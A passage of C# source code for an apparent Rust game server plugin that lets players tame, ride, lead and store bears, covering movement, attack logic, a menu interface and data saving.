                    var vector3 = target.ServerPosition - BearOwner.ServerPosition;
                    var magnitude = vector3.magnitude;
                    if (magnitude <= AttackRange)
                    {
                        if (magnitude > 1.0 / 1000.0)
                            BearOwner.ServerRotation = Quaternion.LookRotation(vector3.normalized);

                        nextAttackTime = Time.realtimeSinceStartup + AttackRate;

                        _rider.MarkHostileFor(60f);
                        target.Hurt(AttackDamage(target.ShortPrefabName), AttackDamageType, BearOwner);

                        BearOwner.BusyTimer.Activate(0.5f);
                        BearOwner.SignalBroadcast(BaseEntity.Signal.Attack);
                        BearOwner.ClientRPC(null, "Attack", target.ServerPosition);

                        return;
                    }
                }

                nextAttackTime = Time.realtimeSinceStartup + AttackRate;

                BearOwner.BusyTimer.Activate(0.5f);
                BearOwner.SignalBroadcast(BaseEntity.Signal.Attack);
                BearOwner.ClientRPC(null, "Attack", BearOwner.ServerPosition + Vector3.forward);
            }

            private bool AttackReady()
            {
                return Time.realtimeSinceStartup >= nextAttackTime;
            }

            private bool IsVisible(Vector3 position, Vector3 target, float maxDistance = float.PositiveInfinity)
            {
                var vector3_1 = target - position;
                var magnitude = vector3_1.magnitude;
                if (magnitude < Mathf.Epsilon)
                    return true;

                var direction = vector3_1 / magnitude;
                var vector3_2 = direction * Mathf.Min(magnitude, 0.01f);
                return IsVisible(new Ray(position + vector3_2, direction), maxDistance);
            }

            private bool IsVisible(Ray ray, float maxDistance = float.PositiveInfinity)
            {
                RaycastHit hit;
                if (ray.origin.IsNaNOrInfinity() || ray.direction.IsNaNOrInfinity() || ray.direction == Vector3.zero ||
                    !BearOwner.WorldSpaceBounds().Trace(ray, out hit, maxDistance))
                    return false;
                RaycastHit hitInfo;
                if (!GamePhysics.Trace(ray, 0.0f, out hitInfo, maxDistance, 1218519041))
                    return true;
                var entity = hitInfo.GetEntity();
                return entity == BearOwner ||
                       entity != null && (bool)BearOwner.GetParentEntity() &&
                       (BearOwner.GetParentEntity().EqualNetID(entity) && hitInfo.IsOnLayer(Rust.Layer.Vehicle_Detailed)) ||
                       hitInfo.distance > (double)hit.distance;
            }

            private static bool AiCaresAbout(BaseEntity ent)
            {
                if (ent is BasePlayer || ent is BaseNpc || ent.ShortPrefabName.Contains("barrel"))
                    return true;

                return false;
            }

            #endregion

            #region Other

            private float lastEatTime = Time.time;

            public void AnimalDecay()
            {
                if (BearOwner.healthFraction == 0.0 || BearOwner.IsDestroyed || (Time.time < (lastInputTime + 600.0) || Time.time < (lastEatTime + 600.0)))
                    return;

                BearOwner.Hurt(BearOwner.MaxHealth() * (1f / BaseRidableAnimal.decayminutes) * (!BearOwner.IsOutside() ? 1f : 0.5f), DamageType.Decay, BearOwner, false);
            }

            public void SwitchMoveState(BaseRidableAnimal.RunState newState)
            {
                if (newState == this.currentRunState)
                    return;
                this.currentRunState = newState;
                this.timeInMoveState = 0.0f;
                BearOwner.SetFlag(BaseEntity.Flags.Reserved8, this.currentRunState == BaseRidableAnimal.RunState.sprint, false, false);
                this.MarkObstacleDistanceDirty();
            }

            public float MoveStateToVelocity(BaseRidableAnimal.RunState stateToCheck)
            {
                float num;
                switch (stateToCheck)
                {
                    case BaseRidableAnimal.RunState.walk:
                        num = HasLead() ? leadSpeed : walkSpeed;
                        break;
                    case BaseRidableAnimal.RunState.run:
                        num = runSpeed;
                        break;
                    case BaseRidableAnimal.RunState.sprint:
                        num = sprintSpeed;
                        break;
                    default:
                        num = 0.0f;
                        break;
                }
                return num;
            }

            private float GetRunSpeed()
            {
                return MoveStateToVelocity(currentRunState);
            }

            private void IncreaseState(BaseRidableAnimal.RunState oldState)
            {
                switch (oldState)
                {
                    case BaseRidableAnimal.RunState.stopped:
                        {
                            SwitchMoveState(BaseRidableAnimal.RunState.walk);
                            break;
                        }
                    case BaseRidableAnimal.RunState.walk:
                        {
                            if (BearOwner.health < (BearOwner._maxHealth / 50))
                                break;

                            SwitchMoveState(BaseRidableAnimal.RunState.run);
                            break;
                        }
                }
            }

            private float lastDdrawUpdate = Time.time;

            private void PlayersChecker()
            {
                if (HasDriver())
                    return;

                List<BasePlayer> players = Facepunch.Pool.GetList<BasePlayer>();
                players.Clear();

                Vis.Entities(BearOwner.transform.position, 2f, players);
                try
                {
                    if (players.Count > 0)
                    {
                        foreach (var basePlayer in players)
                        {
                            if (IsFriend(BearOwner.OwnerID, basePlayer.userID) == false)
                                continue;

                            if (ShouldGrow == false && basePlayer.serverInput.IsDown(BUTTON.USE))
                            {
                                _plugin.DrawUI_BearMenu(basePlayer, BearOwner.net.ID);

                                if (PlayersWithUI.Contains(basePlayer) == false)
                                    PlayersWithUI.Add(basePlayer);
                            }

                            if (lastDdrawUpdate <= Time.time)
                            {
                                string text = ShouldGrow ? _plugin.GetLang("BEAR_GROWING_SECOND", basePlayer.UserIDString, GrowingSeconds) : _plugin.GetLang("BEAR_GROWING_USE_MENU", basePlayer.UserIDString);
                                DrawText(basePlayer, BearOwner.transform.position + Vector3.up, text);
                                lastDdrawUpdate = Time.time + 1f;
                            }
                        }
                    }

                    for (var i = PlayersWithUI.Count - 1; i >= 0; i--)
                    {
                        var player = PlayersWithUI[i];

                        var distance = Vector3.Distance(player.transform.position, this.transform.position);
                        if (distance > 2f)
                        {
                            //Debug.Log("Close " + distance);
                            CuiHelper.DestroyUi(player, InterfaceManager.UI_Layer);
                            PlayersWithUI.Remove(player);
                        }
                    }
                }
                catch
                {
                    // ignored
                }

                Facepunch.Pool.FreeList(ref players);

                //_plugin.TrackEnd();
            }

            private void AddSaddle()
            {
                BaseVehicleSeat saddle = GameManager.server.CreateEntity("assets/prefabs/vehicle/seats/saddletest.prefab", new Vector3(0, 0.8f) - BearOwner.transform.forward * 0.15f) as BaseVehicleSeat;
                if (saddle == null)
                {
                    return;
                }

                saddle.SetParent(BearOwner);
                saddle.Spawn();
                _saddle = saddle;
            }


            private void ClearBear()
            {
                if (BearOwner == null)
                    return;


                Invoke(nameof(RemoveMovement), 0.1f);
            }

            private void RemoveMovement()
            {
                if (BearOwner == null)
                    return;

                BearOwner.StopMoving();
                BearOwner.GetNavAgent.autoRepath = false;
                BearOwner.Pause();

                BearOwner.CancelInvoke(BearOwner.TickAi);
                BearOwner.CancelInvoke(BearOwner.TickNavigation);
                BearOwner.CancelInvoke(BearOwner.TickStuck);
                BearOwner.CancelInvoke(BearOwner.TickNavigationWater);

                var script1 = BearOwner.GetComponent<AiManagedAgent>();
                UnityEngine.Object.Destroy(script1);
                // var script2 = BearOwner.GetComponent<UtilityAIComponent>();
                // UnityEngine.Object.Destroy(script2);

                BearOwner.CurrentBehaviour = BaseNpc.Behaviour.Idle;
            }

            private IEnumerator DoGrow(PluginData.BearData data)
            {
                int startTime = GrowingSeconds;
                int curTime = 0;

                while (curTime < startTime)
                {
                    curTime++;
                    GrowingSeconds--;
                    data.GrowSeconds = GrowingSeconds;
                    yield return CoroutineEx.waitForSeconds(1f);
                }

                ShouldGrow = false;

                yield break;
            }

            #endregion

            #endregion

            #region Movement

            public float lastInputTime;
            public Vector3 currentVelocity;
            private float timeAlive;
            private TimeUntil dropUntilTime;

            private void OnPhysicsNeighbourChanged()
            {
                this.Invoke(nameof(DelayedDropToGround), UnityEngine.Time.fixedDeltaTime);
            }

            public void DelayedDropToGround()
            {
                this.DropToGround(BearOwner.transform.position, true);
                this.UpdateGroundNormal(true);
            }

            public virtual float WaterFactor()
            {
                return WaterLevel.Factor(this.WorldSpaceBounds().ToBounds(), BearOwner);
            }

            public OBB WorldSpaceBounds()
            {
                return new OBB(BearOwner.transform.position, BearOwner.transform.lossyScale, BearOwner.transform.rotation, BearOwner.bounds);
            }

            public void UpdateMovement(float delta)
            {
                float num1 = this.WaterFactor();
                if (Math.Abs(desiredRotation) > 0.1f)
                    this.MarkObstacleDistanceDirty();
                if (num1 >= 0.3f && this.currentRunState > BaseRidableAnimal.RunState.run)
                    this.currentRunState = BaseRidableAnimal.RunState.run;
                else if (num1 >= 0.45f && this.currentRunState > BaseRidableAnimal.RunState.walk)
                    this.currentRunState = BaseRidableAnimal.RunState.walk;
                if (Time.time - this.lastInputTime > 3.0 && HasLead() == false)
                {
                    this.currentRunState = BaseRidableAnimal.RunState.stopped;
                    this.desiredRotation = 0.0f;
                }

                if (HasLead())
                {
                    Vector3 bearPosition = BearOwner.transform.position;
                    Vector3 leadPosition = _leadTarget.transform.position;
                    Vector3 lhs1 = Vector3Ex.Direction2D(bearPosition + BearOwner.transform.right * 1f, bearPosition);
                    Vector3 lhs2 = Vector3Ex.Direction2D(bearPosition + BearOwner.transform.forward * 0.01f, bearPosition);
                    Vector3 rhs1 = Vector3Ex.Direction2D(leadPosition, bearPosition);
                    float num2 = Vector3.Dot(lhs1, rhs1);
                    Vector3 rhs2 = rhs1;
                    float num3 = Vector3.Dot(lhs2, rhs2);
                    bool flag = Vector3Ex.Distance2D(leadPosition, bearPosition) > 2.5;
                    int num4 = (double)Vector3Ex.Distance2D(leadPosition, bearPosition) > 10.0 ? 1 : 0;
                    if (flag || num3 < 0.95f)
                    {
                        float num5 = Mathf.InverseLerp(0.0f, 1f, num2);
                        float num6 = 1f - Mathf.InverseLerp(-1f, 0.0f, num2);
                        this.desiredRotation = 0.0f;
                        this.desiredRotation += num5 * 1f;
                        this.desiredRotation += num6 * -1f;
                        if ((double)Mathf.Abs(this.desiredRotation) < 1.0 / 1000.0)
                            this.desiredRotation = 0.0f;
                        if (flag)
                            this.SwitchMoveState(BaseRidableAnimal.RunState.walk);
                        else
                            this.SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                    }
                    else
                    {
                        this.desiredRotation = 0.0f;
                        this.SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                    }

                    if (num4 != 0)
                    {
                        SetLead(null);
                        this.SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                    }
                }

                float obstacleDistance = this.GetObstacleDistance();
                BaseRidableAnimal.RunState newState = this.StateFromSpeed(obstacleDistance * this.GetRunSpeed());
                if (newState < this.currentRunState)
                    this.SwitchMoveState(newState);
                float desiredVelocity = this.GetDesiredVelocity();
                Vector3 direction = Vector3.forward * Mathf.Sign(desiredVelocity);
                float num7 = Mathf.InverseLerp(0.85f, 1f, obstacleDistance);
                float num8 = Mathf.InverseLerp(1.25f, 10f, obstacleDistance);
                double num9 = 1.0 - (double)Mathf.InverseLerp(20f, 45f, Vector3.Angle(Vector3.up, this.averagedUp));

                float b1 = (float)((double)num7 * 0.100000001490116 + (double)num8 * 0.9f);
                float b2 = Mathf.Min(Mathf.Clamp01(Mathf.Min((float)(num9 + 0.2f), b1)) * this.GetRunSpeed(), desiredVelocity);
                float num10 = (double)b2 < (double)this.currentSpeed ? 3f : 1f;
                this.currentSpeed = (double)Mathf.Abs(this.currentSpeed) >= 2.0 || Math.Abs(desiredVelocity) > 0.1f ? Mathf.Lerp(this.currentSpeed, b2, delta * num10) : Mathf.MoveTowards(this.currentSpeed, 0.0f, delta * 3f);
                if (Math.Abs(b1) < 0.01f)
                    this.currentSpeed = 0.0f;
                float num11 = (float)(((1f - Mathf.InverseLerp(2f, 7f, this.currentSpeed)) + 1.0) / 2.0);

                Vector3 frontPosition = BearOwner.transform.position + BearOwner.transform.forward * 1.1f + new Vector3(0, 1.4f, 0);
                //BasePlayer.activePlayerList[0].SendConsoleCommand("ddraw.sphere", 0.1f, Color.green, frontPosition, 0.1f);

                if (Math.Abs(this.desiredRotation) > 0.1f)
                {
                    var bearTransform = BearOwner.transform;
                    Quaternion rotation = bearTransform.rotation;

                    bearTransform.Rotate(Vector3.up, this.desiredRotation * delta * this.rotateSpeed * num11);
                    Vector3 newfrontPosition = bearTransform.position + bearTransform.forward * 1.1f + new Vector3(0, 1.4f, 0) + (bearTransform.right * desiredRotation) * 0.2f;

                    if (!HasLead() && Vis.AnyColliders(newfrontPosition, this.obstacleDetectionRadius * _config.RotSphereDis, 1503731969, QueryTriggerInteraction.Ignore))
                    {
                        BearOwner.transform.rotation = rotation;
                    }
                }

                Vector3 vector3_1 = BearOwner.transform.TransformDirection(direction);
                Vector3 normalized = vector3_1.normalized;
                float num12 = this.currentSpeed * delta;
                Vector3 vector3_2 = BearOwner.transform.position + normalized * (num12 * Mathf.Sign(this.currentSpeed));
                this.currentVelocity = vector3_1 * this.currentSpeed;
                this.UpdateGroundNormal(false);
                if ((double)this.currentSpeed <= 0.0 && (double)this.timeAlive >= 2.0 && (double)(float)this.dropUntilTime <= 0.0)
                    return;
                RaycastHit hitInfo;
                bool flag1 = UnityEngine.Physics.SphereCast(frontPosition, this.obstacleDetectionRadius, normalized, out hitInfo, num12, 1503731969);
                bool flag2 = UnityEngine.Physics.SphereCast(BearOwner.transform.position + BearOwner.transform.InverseTransformPoint(frontPosition).y * BearOwner.transform.up, this.obstacleDetectionRadius, normalized, out hitInfo, num12, 1503731969);

                if (!Vis.AnyColliders(frontPosition + normalized * num12, this.obstacleDetectionRadius, 1503731969, QueryTriggerInteraction.Ignore) && !flag1 && !flag2)
                {
                    if (this.DropToGround(vector3_2 + Vector3.up * this.maxStepHeight, false) == false)
                        this.currentSpeed = 0.0f;
                }
                else
                {
                    this.currentSpeed = 0.0f;
                }

            }

            public float GetDesiredVelocity()
            {
                return this.MoveStateToVelocity(this.currentRunState);
            }

            private BaseRidableAnimal.RunState StateFromSpeed(float speedToUse)
            {
                if ((double)speedToUse <= (double)this.MoveStateToVelocity(BaseRidableAnimal.RunState.stopped))
                    return BaseRidableAnimal.RunState.stopped;
                if ((double)speedToUse <= (double)this.MoveStateToVelocity(BaseRidableAnimal.RunState.walk))
                    return BaseRidableAnimal.RunState.walk;
                return (double)speedToUse <= (double)this.MoveStateToVelocity(BaseRidableAnimal.RunState.run) ? BaseRidableAnimal.RunState.run : BaseRidableAnimal.RunState.sprint;
            }

            private void UpdateDropToGroundForDuration(float duration)
            {
                this.dropUntilTime = (TimeUntil)duration;
            }

            #endregion

            private float timeInMoveState;
            private float lastForwardPressedTime;
            private float forwardHeldSeconds;
            private float lastBackwardPressedTime;
            private float backwardHeldSeconds;
            private float lastSprintPressedTime;
            private float sprintHeldSeconds;

            private void RiderInput(InputState inputState, BasePlayer player)
            {
                float num1 = UnityEngine.Time.time - this.lastInputTime;
                this.lastInputTime = UnityEngine.Time.time;
                float num2 = Mathf.Clamp(num1, 0.0f, 1f);
                Vector3 zero = Vector3.zero;
                this.timeInMoveState += num2;
                if (inputState == null)
                    return;
                if (inputState.IsDown(BUTTON.FORWARD))
                {
                    this.lastForwardPressedTime = UnityEngine.Time.time;
                    this.forwardHeldSeconds += num2;
                }
                else
                    this.forwardHeldSeconds = 0.0f;

                if (inputState.IsDown(BUTTON.BACKWARD))
                {
                    this.lastBackwardPressedTime = UnityEngine.Time.time;
                    this.backwardHeldSeconds += num2;
                }
                else
                    this.backwardHeldSeconds = 0.0f;

                if (inputState.IsDown(BUTTON.SPRINT))
                {
                    this.lastSprintPressedTime = UnityEngine.Time.time;
                    this.sprintHeldSeconds += num2;
                }
                else
                    this.sprintHeldSeconds = 0.0f;
                if ((double)this.forwardHeldSeconds > 0.0)
                {
                    if (this.currentRunState == BaseRidableAnimal.RunState.stopped)
                        this.SwitchMoveState(BaseRidableAnimal.RunState.walk);
                    else if (this.currentRunState == BaseRidableAnimal.RunState.walk)
                    {
                        if ((double)this.sprintHeldSeconds > 0.0)
                            this.SwitchMoveState(BaseRidableAnimal.RunState.run);
                    }
                    else if (this.currentRunState == BaseRidableAnimal.RunState.run && (double)this.sprintHeldSeconds > 1.0)// && this.CanInitiateSprint())
                        this.SwitchMoveState(BaseRidableAnimal.RunState.sprint);
                }
                else if ((double)this.backwardHeldSeconds > 1.0)
                {
                    this.ModifyRunState(-1);
                    this.backwardHeldSeconds = 0.1f;
                }
                else if ((double)this.backwardHeldSeconds == 0.0 && (double)this.forwardHeldSeconds == 0.0 && ((double)this.timeInMoveState > 1.0 && this.currentRunState != BaseRidableAnimal.RunState.stopped))
                    this.ModifyRunState(-1);

                if (this.currentRunState == BaseRidableAnimal.RunState.sprint && (/*!this.CanSprint() ||*/ (double)UnityEngine.Time.time - (double)this.lastSprintPressedTime > 5.0))
                    this.ModifyRunState(-1);
                if (inputState.IsDown(BUTTON.RIGHT))
                {
                    this.desiredRotation = 1f;
                }
                else if (inputState.IsDown(BUTTON.LEFT))
                {
                    this.desiredRotation = -1f;
                }
                else
                    this.desiredRotation = 0.0f;
            }

            private void ModifyRunState(int dir)
            {
                if (this.currentRunState == BaseRidableAnimal.RunState.stopped && dir < 0 || this.currentRunState == BaseRidableAnimal.RunState.sprint && dir > 0)
                    return;
                this.SwitchMoveState(this.currentRunState + dir);
            }
        }

        #endregion

        #region Interface v0.0.1

        private static InterfaceManager _interface;

        private void DrawUI_BearMenu(BasePlayer player, uint bear)
        {
            var controller = _bearControllers[bear];

            string gui = InterfaceManager.GetInterface("BearMain");

            gui = gui.Replace("{bear}", bear.ToString());
            gui = gui.Replace("%TEXT%", GetLang("BEAR_MENU_TITLE", player.UserIDString));
            gui = gui.Replace("{LeadColor}", GetColor(controller.HasLead() ? "#18CA77" : "#CA2539", 0.8f));

            CuiHelper.DestroyUi(player, InterfaceManager.UI_Layer);
            CuiHelper.AddUi(player, gui);
        }

        private void DrawUI_BearMenu(BasePlayer player)
        {
            string gui = InterfaceManager.GetInterface("BearInstruciont");

            CuiHelper.DestroyUi(player, InterfaceManager.UI_Instruction);
            CuiHelper.AddUi(player, gui);
        }

        private class InterfaceManager
        {
            #region Vars

            public static InterfaceManager Instance;
            public const string UI_Layer = "UI_BearRide";
            public const string UI_Instruction = "UI_Instruction_Bear";
            public Dictionary<string, string> Interfaces;

            #endregion

            #region Main

            public InterfaceManager()
            {
                Instance = this;
                Interfaces = new Dictionary<string, string>();
                BuildInterface();
                BuildInstruction();
            }

            public static void AddInterface(string name, string json)
            {
                if (Instance.Interfaces.ContainsKey(name))
                {
                    _plugin.PrintError($"Error! Tried to add existing cui elements! -> {name}");
                    return;
                }

                Instance.Interfaces.Add(name, json);
            }

            public static string GetInterface(string name)
            {
                string json = string.Empty;
                if (Instance.Interfaces.TryGetValue(name, out json) == false)
                {
                    _plugin.PrintWarning($"Warning! UI elements not found by name! -> {name}");
                }

                return json;
            }

            public static void DestroyAll()
            {
                for (var i = 0; i < BasePlayer.activePlayerList.Count; i++)
                {
                    var player = BasePlayer.activePlayerList[i];
                    CuiHelper.DestroyUi(player, UI_Layer);
                    CuiHelper.DestroyUi(player, UI_Instruction);
                }
            }

            #endregion

            private void BuildInstruction()
            {
                CuiElementContainer container = new CuiElementContainer()
                {
                    {
                        new CuiPanel
                        {
                            CursorEnabled = false,
                            RectTransform =
                            {
                                AnchorMin = "0.5 0.5",
                                AnchorMax = "0.5 0.5",
                                OffsetMin = "300.426 -343.7",
                                OffsetMax = "427.374 -261.892" //
                            },
                            Image = { Color = "0 0 0 0" }
                        },
                        "Overlay", UI_Instruction
                    },
                    {
                        new CuiElement
                        {
                            Parent = UI_Instruction,
                            Name = "PNG_Instruction",
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Color = "1 1 1 1",
                                    Png = _plugin.GetImage(GetNameByURL(_config.InstructionImage)),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-17.806 -40.904", OffsetMax = "63.476 13.1773028"  ///
                                }
                            },
                        }
                    }
                };
                AddInterface("BearInstruciont", container.ToJson());
            }

            private void BuildInterface()
            {
                CuiElementContainer container = new CuiElementContainer()
                {
                    {
                        new CuiPanel
                        {
                            CursorEnabled = true,
                            RectTransform =
                            {
                                AnchorMin = $"0.5 0.5",
                                AnchorMax = $"0.5 0.5",
                                OffsetMin = "-165 -60",
                                OffsetMax = "165 70"
                            },
                            Image = { Color = "0 0 0 0" }
                        },
                        "Overlay", UI_Layer
                    },
                    {
                        new CuiButton
                        {
                            RectTransform = {AnchorMin = $"-100 -100", AnchorMax = $"100 100"},
                            Button = {Color = "0 0 0 0", Close = UI_Layer, Command = "UI_BearControl close {bear}"},
                            Text = {Text = ""}
                        },
                        UI_Layer
                    },
                    {
                        new CuiElement
                        {
                            Parent = UI_Layer,
                            Name = $"{UI_Layer}.LogoBar",
                            Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = "0 0 0 0"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 1",
                                    AnchorMax = $"1 1",
                                    OffsetMin = "5 -60",
                                    OffsetMax = "-5 -60"
                                },
                            }
                        }
                    },
                    {
                        new CuiElement
                        {
                            Parent = $"{UI_Layer}.LogoBar",
                            Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = "%TEXT%", Align = TextAnchor.MiddleCenter, Color = GetColor("#FFFFFF", 1f), FontSize = 14,
                                    Font = "robotocondensed-bold.ttf"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0",
                                    AnchorMax = $"1 1",
                                    OffsetMax = "0 40"
                                },
                                new CuiOutlineComponent
                                {
                                    Color = "0 0 0 1", Distance = "0.2 0.2"
                                }
                            }
                        }
                    },
                    {
                        new CuiElement
                        {
                            Parent = UI_Layer,
                            Name = $"{UI_Layer}.Follow",
                            Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = "{LeadColor}"
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 1",
                                    AnchorMax = $"0 1",
                                    OffsetMin = "60 -100",
                                    OffsetMax = "110 -50"
                                },
                            }
                        }
                    },
                    {
                        new CuiElement
                        {
                            Parent = $"{UI_Layer}.Follow",
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = _plugin.GetImage(GetNameByURL(_config.FollowImage))
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0",
                                    AnchorMax = $"1 1"
                                }
                            }
                        }
                    },
                    {
                        new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = $"0 0",
                                AnchorMax = $"1 1",
                                OffsetMin = "0 0",
                                OffsetMax = "1 1"
                            },
                            Button =
                            {
                                Color = "0 0 0 0", Command = "UI_BearControl lead {bear}", Close = UI_Layer
                            },
                            Text =
                            {
                                Text = ""
                            }
                        },
                        $"{UI_Layer}.Follow"
                    },
                    {
                        new CuiElement
                        {
                            Parent = UI_Layer,
                            Name = $"{UI_Layer}.Ride",
                            Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = GetColor("#CA2539", 0.8f)
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 1",
                                    AnchorMax = $"0 1",
                                    OffsetMin = "115 -100",
                                    OffsetMax = "165 -50"
                                },
                            }
                        }
                    },
                    {
                        new CuiElement
                        {
                            Parent = $"{UI_Layer}.Ride",
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = _plugin.GetImage(GetNameByURL(_config.RideImage))
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0",
                                    AnchorMax = $"1 1",
                                }
                            }
                        }
                    },
                    {
                        new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = $"0 0",
                                AnchorMax = $"1 1",
                            },
                            Button =
                            {
                                Color = "0 0 0 0", Command = "UI_BearControl ride {bear}", Close = UI_Layer
                            },
                            Text =
                            {
                                Text = ""
                            }
                        },
                        $"{UI_Layer}.Ride"
                    },
                    {
                        new CuiElement
                        {
                            Parent = UI_Layer,
                            Name = $"{UI_Layer}.Inventory",
                            Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = GetColor("#CA2539", 0.8f)
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 1",
                                    AnchorMax = $"0 1",
                                    OffsetMin = "170 -100",
                                    OffsetMax = "220 -50"
                                },
                            }
                        }
                    },
                    {
                        new CuiElement
                        {
                            Parent = $"{UI_Layer}.Inventory",
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = _plugin.GetImage(GetNameByURL(_config.InventoryImage))
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0",
                                    AnchorMax = $"1 1"
                                }
                            }
                        }
                    },
                    {
                        new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = $"0 0",
                                AnchorMax = $"1 1"
                            },
                            Button =
                            {
                                Color = "0 0 0 0", Command = "UI_BearControl inventory {bear}", Close = UI_Layer
                            },
                            Text =
                            {
                                Text = ""
                            }
                        },
                        $"{UI_Layer}.Inventory"
                    },
                    {
                        new CuiElement
                        {
                            Parent = UI_Layer,
                            Name = $"{UI_Layer}.Take",
                            Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = GetColor("#CA2539", 0.8f)
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 1",
                                    AnchorMax = $"0 1",
                                    OffsetMin = "225 -100",
                                    OffsetMax = "275 -50"
                                },
                            }
                        }
                    },
                    {
                        new CuiElement
                        {
                            Parent = $"{UI_Layer}.Take",
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = _plugin.GetImage(GetNameByURL(_config.TakeImage))
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = $"0 0",
                                    AnchorMax = $"1 1"
                                }
                            }
                        }
                    },
                    {
                        new CuiButton
                        {
                            RectTransform =
                            {
                                AnchorMin = $"0 0",
                                AnchorMax = $"1 1",
                            },
                            Button =
                            {
                                Color = "0 0 0 0", Command = "UI_BearControl pickup {bear}", Close = UI_Layer
                            },
                            Text =
                            {
                                Text = ""
                            }
                        },
                        $"{UI_Layer}.Take"
                    },
                };
                AddInterface("BearMain", container.ToJson());
            }
        }
        #endregion

        #region PluginLoading v0.0.4

        private static bool _initiated = false;

        private void StartPluginLoad()
        {
            if (ImageLibrary != null)
            {
                //Load your images here
                AddImage(_config.FollowImage);
                AddImage(_config.RideImage);
                AddImage(_config.TakeImage);
                AddImage(_config.InventoryImage);
                AddImage(_config.InstructionImage);
                CheckStatus();
            }
            else
            {
                PrintError($"ImageLibrary not found! Please, check your plugins list.");
            }
        }

        private void CheckStatus()
        {
            if (!(bool)ImageLibrary.Call("IsReady"))
            {
                PrintError("Plugin is not ready! Images are loading.");
                timer.Once(10f, () => CheckStatus());
            }
            else
            {
                FullLoad();
                PrintWarning("Plugin succesfully loaded!");
            }
        }

        private void FullLoad()
        {
            _interface = new InterfaceManager();
            PluginData.LoadData();

            _initiated = true;

            if (_config.Immortals)
                Subscribe("OnEntityTakeDamage");
        }

        #region ImageLibrary
        [PluginReference] private Plugin ImageLibrary;

        private string GetSizedImade(string name, int size) => GetImage($"{name}_{size}");

        private string GetImage(string name)
        {
            string ID = (string)ImageLibrary?.Call("GetImage", name);
            if (ID == "")
                ID = (string)ImageLibrary?.Call("GetImage", name) ?? ID;

            return ID;
        }

        private void AddImage(string name)
        {
            if (!(bool)ImageLibrary.Call("HasImage", GetNameByURL(name)))
                ImageLibrary.Call("AddImage", name, GetNameByURL(name));
        }

        private static string GetNameByURL(string url)
        {
            var splitted = url.Split('/');
            var endUrl = splitted[splitted.Length - 1];
            var name = endUrl.Split('.')[0];
            return name;
        }

        #endregion


        #endregion

        #region Data v0.0.1
        private static PluginData _data;

        private class PluginData
        {
            private const string BackpackPrefab = "assets/prefabs/misc/item drop/item_drop_backpack.prefab";
            private const string DataPath = "IQBearRide/Data";
            public List<BearData> BearsData;

            public class BearData
            {
                public ulong OwnerId;
                public uint EntityId;
                public float Health;
                public byte[] Inventory;
                public Vector3 LastPosition;
                public bool IsItem = false;
                public int GrowSeconds;

                [JsonIgnore] private ItemContainer _itemContainer;

                [JsonIgnore]
                public ItemContainer Container
                {
                    get
                    {
                        if (_itemContainer == null)
                        {
                            _itemContainer = ByteToItemContainer(Inventory);
                            if (_itemContainer == null)
                            {
                                _itemContainer = new ItemContainer();
                                _itemContainer.ServerInitialize(null, 6);
                                _itemContainer.GiveUID();
                            }

                            //Saving container to raw bytes
                            _itemContainer.onDirty += () =>
                            {
                                if (_itemContainer == null || _itemContainer.itemList.Count < 1)
                                {
                                    Inventory = null;
                                    return;
                                }

                                Inventory = PluginData.ItemContainerToByte(_itemContainer);
                            };
                        }

                        return _itemContainer;
                    }
                }

                public void Drop(Vector3 position)
                {
                    if (Container.itemList.Count > 0)
                    {
                        var dropContainer = Container.Drop(BackpackPrefab, position, Quaternion.identity);
                        if (dropContainer == null) return;

                        dropContainer.lootPanelName = "generic";

                        Container.Clear();
                        ItemManager.DoRemoves();
                    }
                    else
                    {
                        //Debug.Log("Backpack empty");
                    }

                }
            }

            public void BearKilled(Bear bear)
            {
                //Debug.Log("Bear dead");
                if (_unloading)
                    return;

                //Debug.Log("Searching bear in list");

                BearData data = _data.BearsData.Find(x => x.EntityId == bear.net.ID);
                if (data == null)
                    return;

                //Debug.Log("Trying to drop backpack");
                data.Drop(bear.transform.position + new Vector3(0, 2f, 0));

                BasePlayer player = BasePlayer.FindByID(data.OwnerId);
                if (player != null)
                    CuiHelper.DestroyUi(player, InterfaceManager.UI_Instruction);
                _data.BearsData.Remove(data);
            }

            public static Item BearToItem(uint bear)
            {
                Item bearItem = _config.BearItem.ToItem();

                var data = PluginData.Get(bear);
                data.EntityId = bearItem.uid;
                data.IsItem = true;

                return bearItem;
            }

            public static Bear ItemToBear(ulong player, uint item, Vector3 position, bool young)
            {
                Bear bearEntity = CreateControlledBear(player, position, young);
                if (bearEntity == null)
                    return null;

                var data = PluginData.Get(item);
                data.EntityId = bearEntity.net.ID;
                data.IsItem = false;
                data.OwnerId = player;

                if (data.Health > 0)
                    bearEntity.SetHealth(data.Health);

                if (young)
                {
                    data.GrowSeconds = _config.GrowSeconds;
                }

                return bearEntity;
            }

            public static Bear CreateControlledBear(ulong player, Vector3 position, bool young)
            {
